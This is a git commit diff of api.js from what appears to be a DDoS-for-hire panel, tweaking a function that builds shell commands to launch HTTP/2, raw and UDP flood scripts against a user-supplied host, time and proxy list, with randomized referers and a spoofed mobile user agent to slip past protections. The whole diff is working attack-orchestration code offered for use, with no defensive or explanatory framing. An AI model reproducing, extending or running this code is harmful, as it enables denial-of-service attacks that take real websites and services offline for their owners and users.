04aa3e6148a8ce76f702998b4656e52bccc29414
Sasaxturu <120617998+Sasaxturu@users.noreply.github.com>
2025-02-13 22:11:51 +0700

    Update api.js

--- api.js
+++ api.js
@@ -22,7 +22,7 @@ const activeProcesses = new Map();
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
-            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 2 proxy.txt`;
+            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
@@ -38,7 +38,7 @@ const generateCommand = (method, host, port, time) => {
         case 'RAW':
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
-            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
+            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2MERIS':
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
